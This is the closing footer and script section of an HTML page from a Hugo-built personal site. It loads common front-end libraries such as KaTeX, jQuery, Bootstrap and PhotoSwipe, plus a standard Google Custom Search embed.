<a href="http://gohugo.io">Hugo v0.74.3</a> powered  •  Theme by <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a> adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
</p>
</div>
</div>
</div>
</footer>
<script crossorigin="anonymous" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js"></script>
<script crossorigin="anonymous" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js"></script>
<script crossorigin="anonymous" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
<script crossorigin="anonymous" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<script src="https://erbazz.github.io/js/main.js"></script>
<script src="https://erbazz.github.io/js/highlight.min.js"></script>
<script> hljs.initHighlightingOnLoad(); </script>
<script> $(document).ready(function() {$("pre.chroma").css("padding","0");}); </script><script> renderMathInElement(document.body); </script>
<script crossorigin="anonymous" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js"></script>
<script crossorigin="anonymous" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js"></script>
<script src="https://erbazz.github.io/js/load-photoswipe.js"></script>
<script>
  (function() {
    var cx = '009837321390101256498:tbfrha9ha-g';
    var gcse = document.createElement('script');
    gcse.type = 'text/javascript';
    gcse.async = true;
    gcse.src = 'https://cse.google.com/cse.js?cx=' + cx;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(gcse, s);
  })();
</script>
</body>
</html>
